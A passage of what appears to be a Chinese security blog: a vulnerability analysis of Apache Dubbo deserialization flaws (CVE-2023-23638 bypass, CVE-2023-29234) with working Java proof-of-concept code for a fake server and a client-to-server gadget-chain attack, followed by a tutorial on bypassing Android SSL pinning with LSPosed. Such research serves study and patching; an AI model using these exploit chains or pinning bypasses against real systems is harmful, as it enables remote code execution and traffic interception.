+<h4><span id="rawreturn-反序列化方式分析">raw.return 反序列化方式分析</span></h4><blockquote>
+<p>这里如果值为 <code>raw.return</code> ，则会调用 <code>PojoUtils.realize</code> 方法，接着会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，并使用 <code>ClassUtils.forName</code> 方法，其中会对传入的 className 使用应用类加载器进行类加载。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/11.png" alt="image"></p>
+<p>之后对于加载的 class 调用 <code>newInstance</code> 进行实例化。这里首先会去调用 class 默认的 public 构造函数，如果无法访问则会去遍历所有的构造器，优先获取<strong>参数个数为 0 的构造函数</strong>并反射调用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/12.png" alt="image"></p>
+<p>之后便是漏洞的一大利用点，它针对 HashMap 当中剩下的键值，先尝试获取 key 在实例化 class 当中对应 field 的 setter 方法（要求为单参数），如果可以获取到的话。会用和刚才相同的逻辑递归实例化参数值，并反射调用；如果获取不到 setter 方法，则直接反射设置 field 的值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/13.png" alt="image"></p>
+<p>因此针对 <code>raw.return</code> 反序列化方式的利用是通过 Map 的方式来传入利用 class，可利用 class 的位置有 3 个：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">public</span>/<span class="keyword">private</span> 修饰的无参构造函数</span><br><span class="line"><span class="number">2.</span> 参数为 <span class="number">1</span> 的 setter 方法</span><br><span class="line"><span class="number">3.</span> 支持对实例化的 class 任意字段赋值</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="bean-反序列化方式分析">bean 反序列化方式分析</span></h4><blockquote>
+<p>这里会先遍历判断每个参数值是否为 <code>JavaBeanDescriptor</code> 类型，如果是则调用 <code>JavaBeanSerializeUtil.deserialize</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/14.png" alt="image"></p>
+<p>后面会调用到 <code>instantiateForDeserialize</code> 实例化方法，其中调用<code>name2Class</code> 方法中的 <code>Class.forName</code> 进行类加载，然后 <code>instatiate</code> 实例化。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/15.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/16.png" alt="image"></p>
+<p>之后 <code>deserializeInternal</code> ，与 raw.return 的利用思路类似，如果 <code>beanDescriptor</code> 实例的 type 等于 <code>TYPE_BEAN</code> 的话则会依次执行指定 key 字段的 setter 方法或者反射为字段赋值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/17.png" alt="image"></p>
+<p><strong>PS</strong>：其中 type 可以通过构造 <code>beanDescriptor</code> 实例时设置。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/18.png" alt="image"></p>
+</blockquote>
+<h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
+<p>这个利用比较特殊，需要配置中开启 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项才能使用。<br>这里如果参数值为 byte[] 数组的话，则会传入 <code>UnsafeByteArrayInputStream</code> 构造函数当中，后加载并调用 <code>NativeJavaObjectInput</code> 的 <code>deserialize</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/19.png" alt="image"></p>
+<p>该类的 inputStream 字段封装了 ObjectInputStream 输入流，最终反序列化时也会调用的是后者，因此可触发二次反序列化。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/20.png" alt="image"></p>
+</blockquote>
+<h2><span id="cve-2023-23638-学习-bypass-思路">CVE-2023-23638 （学习 bypass 思路）</span></h2><blockquote>
+<p>受影响版本：Apache Dubbo 3.0.x &lt;&#x3D; 3.0.13；3.1.x &lt;&#x3D; 3.1.5<br>前版本 diff 分析<br><code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> 方法当中，会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，调用 <code>SerializeClassChecker.getInstance().validateClass</code> ，里面会作黑名单检查。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/21.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/22.png" alt="image"></p>
+</blockquote>
+<h3><span id="bypass-思路">bypass 思路</span></h3><h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
+<p>这个反序列化方式可以让我们触发一个二次反序列化，从而绕过上述安全检查。但是困难点在于 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项默认未开启，因此利用思路就是寻找如何将它打开。<br>于是这个 <code>org.apache.dubbo.common.utils.ConfigUtils#setProperties</code> 方法就十分有用，利用它可将<code>CommonConstants.ENABLE_NATIVE_JAVA_GENERIC_SERIALIZE</code> 属性设置为 true 即可。当然从 dubbo 的源码中可知 <code>System.setProperties</code> 也是可以直接设置 dubbo 服务属性的。<br>因此绕过部分的 map 就可以写成：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/23.png" alt="image"></p>
+</blockquote>
+<h4><span id="rawreturn-反序列化方式">raw.return 反序列化方式</span></h4><blockquote>
+<p>将 <code>SerializeClassChecker</code> 类的 <code>CLASS_DESERIALIZE_BLOCKED_SET</code> 置空或者 <code>OPEN_CHECK_CLASS</code> 设置为 false，这个类实例的获取方式为单例模式，因此需要控制 <code>INSTANCE</code> 字段为上面指定的实例。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/24.png" alt="image"></p>
+<p>绕过部分的 map 可以写成：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/25.png" alt="image"></p>
+</blockquote>
+<h3><span id="修复方案">修复方案</span></h3><blockquote>
+<p>新增 <code>SerializeClassChecker</code> 类检查器，其中指定了 <code>dubbo.application.check-serializable</code> 默认为 true。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/26.png" alt="image"></p>
+<p>其中的 <code>validateClass</code> 方法会检查指定反序列化类是否可序列化。这个方法会在 <code>realize0</code> 中调用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/27.png" alt="image"></p>
+<p>之前需要用来设置属性的利用类 <code>org.apache.dubbo.common.utils.ConfigUtils</code> 以及 <code>java.lang.System</code> 均未实现序列化接口，因此不再可利用；同样，<code>org.apache.dubbo.common.utils.SerializeClassChecker</code> 也未实现序列化接口，无法覆盖其相关检查字段。</p>
+</blockquote>
+<h2><span id="cve-2023-29234-1day">CVE-2023-29234 （1day）</span></h2><blockquote>
+<p>受影响版本：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/28.png" alt="image"></p>
+<p>git diff: <a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a">https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a</a><br><code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 方法抛出异常的地方作了修改，而之前版本会直接打印 obj 对象，隐式触发 <code>toString</code> 方法，漏洞场景类似 CVE-2021-43297。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/29.png" alt="image"></p>
+<p>反向溯源调用位置，位于该函数的 switch-case 语句的 DubboCodec.RESPONSE_WITH_EXCEPTION 分支处调用 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</code></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/30.png" alt="image"></p>
+<p>调用链如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">    ---&gt;</span><br><span class="line">        handleException()</span><br><span class="line">            ---&gt;</span><br><span class="line">                ObjectInput.readThrowable()</span><br><span class="line">                    ---&gt;</span><br><span class="line">                        obj.toString()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vivo_tech/article/details/115633937">Dubbo 编解码那些事_decodeablerpcresult-CSDN博客</a> 可知 <code>DecodeableRpcResult</code> 这个类是在 dubbo 服务的消费者接收提供者方发来的响应时解码使用。</p>
+</blockquote>
+<h4><span id="利用方式一fake-server">利用方式一：fake server</span></h4><blockquote>
+<p>测试版本：Apache Dubbo 3.1.10<br>我们知道 dubbo 支持多种序列化方式，对于 dubbo 协议来说默认为 hessian2，其他如下所示（hessian2 对应 id 为 2，也可以通过 <code>Serialization.getContentTypeId()</code> 获得）</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/31.png" alt="image"></p>
+<p>由官方文档可知，这个协议如何配置完全由服务方定的，因此完全可以做一个 fake server 来诱导客户端主动连接。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/32.png" alt="image"></p>
+<p>因此我们可以重写服务端编码响应信息函数的部分逻辑，主动构造一个用于上面提到的 toString 调用链对象来替代 Throwable 实例 th。<br>具体重写位置在 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#encodeResponseData(org.apache.dubbo.remoting.Channel, org.apache.dubbo.common.serialize.ObjectOutput, java.lang.Object, java.lang.String)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encodeResponseData</span><span class="params">(Channel channel, ObjectOutput out, Object data, String version)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> (Result) data;</span><br><span class="line">        <span class="comment">// currently, the version value in Response records the version of Request</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">attach</span> <span class="operator">=</span> Version.isSupportResponseAttachment(version);</span><br><span class="line"><span class="comment">//         Throwable th = result.getException();   </span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">th</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 利用点： 用于 toString 的 gadget chain</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">                th = getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (th == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> result.getValue();</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_NULL_VALUE_WITH_ATTACHMENTS : RESPONSE_NULL_VALUE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_VALUE_WITH_ATTACHMENTS : RESPONSE_VALUE);   </span><br><span class="line">                out.writeObject(ret);   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.writeByte(attach ? RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS : RESPONSE_WITH_EXCEPTION);</span><br><span class="line"><span class="comment">//            out.writeThrowable(th); </span></span><br><span class="line">            out.writeObject(th);    <span class="comment">// 直接序列化对象即可</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (attach) &#123;</span><br><span class="line">            <span class="comment">// returns current version of Response to consumer side.</span></span><br><span class="line">            result.getObjectAttachments().put(DUBBO_VERSION_KEY, Version.getProtocolVersion());</span><br><span class="line">            out.writeAttachments(result.getObjectAttachments());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 toString 调用链以 Rome toString 的利用部分为例，师傅们也可以选择&#x2F;挖掘其他可利用的 gadget；同时，为了方便这里直接指定服务端的协议配置中的序列化方式为 nativejava，它反序列化时直接会使用 <code>ObjectInputStream#readObject</code> 。大家也可以探索一下其他序列化方式当中的黑名单绕过情况。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;nativejava&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端发起正常服务请求后，解码响应信息时顺利触发至 <code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 位置，状态如下：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/33.png" alt="image"></p>
+</blockquote>
+<h4><span id="利用方式二客户端打服务端">利用方式二：客户端打服务端</span></h4><blockquote>
+<p>测试版本：3.1.5<br>由于 dubbo 并没有限制客户端不能发送 Response 数据，因此客户端同样可以构造一个 Response 信息发给服务端。<br>但是在服务端解码响应信息时，即函数调用位置为 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#decodeBody</code>，不同版本之间存在差异性，这里测试了一下 3.1.10 以及 3.1.5 之间的区别。<br>首先是 3.1.5 版本，注意到在创建 <code>DecodeableRpcResult</code> 实例时，其中一个构造参数 <code>invocation</code> 来自于 <code>getRequestData(id)</code></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/34.png" alt="image"></p>
+<p>跟入可知这个 <code>invocation</code> 来自于 dubbo 服务当中还没处理完毕的请求，会根据 id 值来获取，而由于我们这里只发送了一个 Response 信息，<code>DefaultFuture</code> 当中的 <code>FUTURES</code> map 为空，这里也就会返回 null。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/35.png" alt="image"></p>
+<p>但是依然可以将 <code>DecodeableRpcResult</code> 实例构造出来，并设置到 <code>res</code> 变量的 <code>mResult</code> 字段当中。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/36.png" alt="image"></p>
+<p>后续在触发到 toString 入口的过程中，不会因为 <code>mResult</code> 字段为 null 或者非 <code>Decodeable</code> 类而中断（<code>DecodeableRpcResult</code> 是 <code>Decodeable</code> 的实现）。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/37.png" alt="image"></p>
+<p>而对于 3.1.10 版本，<code>getRequestData</code> 方法如果获取不到 <code>future</code> 会直接抛出异常，进而无法创建出有效的 <code>DecodeableRpcResult</code> 实例。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/38.png" alt="image"></p>
+<p>进而，后续 <code>message</code> 参数会由于是 null 而直接返回。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/39.png" alt="image"></p>
+<p>这里给出 3.1.5 版本下的测试 POC 核心部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">boos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">nativeJavaBoos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Serialization</span> <span class="variable">serialization</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaSerialization</span>();</span><br><span class="line">        <span class="type">NativeJavaObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObjectOutput</span>(nativeJavaBoos);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// header.</span></span><br><span class="line">        <span class="type">byte</span>[] header = <span class="keyword">new</span> <span class="title class_">byte</span>[HEADER_LENGTH];</span><br><span class="line">        <span class="comment">// set magic number.</span></span><br><span class="line">        Bytes.short2bytes(MAGIC, header);</span><br><span class="line">        <span class="comment">// set request and serialization flag.</span></span><br><span class="line">        header[<span class="number">2</span>] = serialization.getContentTypeId();</span><br><span class="line"></span><br><span class="line">        header[<span class="number">3</span>] = Response.OK;</span><br><span class="line">        Bytes.long2bytes(<span class="number">1</span>, header, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// result</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>); <span class="comment">// Rome toString 利用链</span></span><br><span class="line">        out.writeByte(RESPONSE_WITH_EXCEPTION);</span><br><span class="line">        out.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        Bytes.int2bytes(nativeJavaBoos.size(), header, <span class="number">12</span>);</span><br><span class="line">        boos.write(header);</span><br><span class="line">        boos.write(nativeJavaBoos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] responseData = boos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">20880</span>);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        outputStream.write(responseData);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">getThrowablePayload</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, o);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> delegate;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/40.png" alt="image"></p>
+<p>完整 POC 项目基于 <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC</a> 作的修改和添加，可见 <a target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting/DubboPOC">CVE-2023-29234</a><br><strong>PS：</strong>git diff 当中还存在其他位置的 patch，值得进一步探索其他的利用方式（篇幅有限）。</p>
+</blockquote>
+<h2><span id="引用">引用</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12396">Apache dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索 - 先知社区 (aliyun.com)</a><br>[2] <a target="_blank" rel="noopener" href="https://lists.apache.org/thread/wb2df2whkdnbgp54nnqn0m94rllx8f77">CVE-2023-29234: Bypass serialize checks in Apache Dubbo-Apache Mail Archives</a><br>[3] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">开发服务 | Apache Dubbo</a><br>[4] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333">Apache Dubbo CVE-2023-23638 JavaNative 反序列化漏洞分析 - 先知社区 (aliyun.com)</a><br>[5] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vHJpE2fZ8Lne-xFggoQiAg">【漏洞分析】Dubbo Pre-auth RCE（CVE-2021-30179） (qq.com)</a><br>[6] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/docs/concepts/rpc-protocol/">RPC 通信协议 | Apache Dubbo</a><br>[7] <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC&#x2F;src&#x2F;main&#x2F;java&#x2F;top&#x2F;lz2y&#x2F;vul&#x2F;CVE202323638.java at main · lz2y&#x2F;DubboPOC (github.com)</a><br>[8] <a target="_blank" rel="noopener" href="https://github.com/y1ong/blog-timeline/issues/334">Apache Dubbo 反序列化漏洞（CVE-2023-29234） · Issue #334 · y1ong&#x2F;blog-timeline (github.com)</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/22/LSPosed-SSL/">
+                APP 测试 - LSPosed 绕过 SSL 证书抓包
+            </a>
+        </h2>
+    
+    <time>
+        Jan 22, 2024
+    </time>
+    <section class="content">
+        <h1><span id="app-测试-lsposed-绕过-ssl-证书抓包">APP 测试 - LSPosed 绕过 SSL 证书抓包</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/279f59b.html">LuckySec</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>前面介绍了通过<a target="_blank" rel="noopener" href="http://www.luckysec.cn/posts/98df6d1a.html">《VirtualXposed 绕过 SSL 证书抓包》</a>，这个方法有些局限性，比如不能在电脑上的《夜神模拟器》、《雷电模拟器》运行，需要一部测试手机等因素，对于部分人来说可能不太方便，还是更喜欢都在电脑上完成这系列操作，可以尝试用 LSPosed 绕过 SSL 证书抓包。</p>
+</blockquote>
+<h2><span id="0x01-工具简介">0x01 工具简介</span></h2><blockquote>
+<p>LSPosed 是一个基于 Riru&#x2F;Zygisk 的 ART Hook 框架，该框架利用 LSPlant 挂钩框架提供与 OG Xposed 一致的 API, 支持 Android 8.1 ~ 13。</p>
+<p>Xposed 是一个模块框架，可以在不接触任何 APK 的情况下改变系统和应用程序的行为。利用 Xposed 的 TrustMeAlready 模块插件，可以防止软件检测抓包，绕过大部分 ssl-pinning，保证 APP 抓包的可续性能。</p>
+</blockquote>
+<h2><span id="0x02-下载安装">0x02 下载安装</span></h2><blockquote>
+<p>特别提示：在安装之前需要注意以下几点：</p>
+<ul>
+<li>LSPosed 项目地址：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></li>
+<li>TrustMeAlready 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ViRb3/TrustMeAlready/releases">https://github.com/ViRb3/TrustMeAlready/releases</a></li>
+<li>系统： Android 8.1 ~ 13</li>
+<li>安装 Magisk v23+ (Riru) &#x2F; v24+ (Zygisk)</li>
+<li>（针对 Riru 风格）从 Magisk 库安装Riru v25+</li>
+<li>在 Magisk 应用程序中下载并安装LSPosed</li>
+<li>重启</li>
+</ul>
+</blockquote>
+<h2><span id="0x03-抓包教程">0x03 抓包教程</span></h2><blockquote>
+<p>注意：如果用雷电模拟器请使用 9.0.19 或之前的版本，避免不必要的问题发生。</p>
+<p>以夜神模拟器为例，添加并运行一个 Android 9 的虚拟机。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/1.png" alt="image"></p>
+<p>在模拟器设置里将虚拟机设置为网络桥接模式、开启 ROOT（默认开启），设置好后重启虚拟机。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/2.png" alt="image"></p>
+<p>在夜神模拟器虚拟机里安装 <code>Magisk.apk</code>、<code>Magisk Terminal Emulato.apk</code>、<code>app-debug.apk</code>（安装成功不显示在主界面）、<code>LSPosed-manager.apk</code>。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/3.png" alt="image"></p>
+<p>打开 <code>Magisk Terminal Emulator.apk</code>，按照如下步骤操作：输入 m 按回车 &gt; 再输入 y 按回车 &gt; 超级用户授权允许 &gt; 再输入 1 按回车 &gt; 输入 a 按回车 &gt; 再输入 1 按回车 &gt; 完毕。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/4.png" alt="image"></p>
+<p>上述步骤完成后，重启模拟器，打开 <code>Magisk.apk</code> 可以发现 Magisk 安装成功。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/5.png" alt="image"></p>
+<p>打开 <code>Magisk.apk</code> &gt; 点击右上角齿轮按钮 &gt; 界面往下滑动，找到 Zygisk 选项打开并重启模拟器虚拟机。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/6.png" alt="image"></p>
+<p>接着将 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 复制到模拟器文件夹里面。打开 <code>Magisk.apk</code> &gt; 底部模块选项 &gt; 从本地安装 &gt; 选择模拟器文件夹内的 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 卡刷包。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/7.png" alt="image"></p>
+<p>重启模拟器虚拟机后，打开 <code>LSPosed-manager.apk</code>，可以发现 LSPosed 安装成功了。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/8.png" alt="image"></p>
+<p>然后在夜神模拟器虚拟机里安装 <code>TrustMeAlready-v1.11.apk</code>，安装这个 apk 主界面图标可能会卡在安装的动画，不必在意，忽略即可。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/9.png" alt="image"></p>
+<p>接着打开 <code>LSPosed-manager.apk</code> 的底部模块选项，点击 TrustMeAlready，启动模块，选择要测试的 APP。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/10.png" alt="image"></p>
+<p>使用 BurpSuite 工具开启代理抓包，设置监听地址为同一局域网 IP 地址，端口自定义，不与电脑其他端口冲突使用即可。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/11.png" alt="image"></p>
+<p>在夜神模拟器手机系统设置中将 WiFi 的代理设置为 BurpSuite 监听器的地址。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/12.png" alt="image"></p>
+<p>最后，打开要测试的 APP，刷新功能页面，在 BurpSuite 中即可看到抓取的 HTTP&#x2F;HTTPS 网络数据包。</p>
+<p><img src="/2024/01/22/LSPosed-SSL/13.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/">
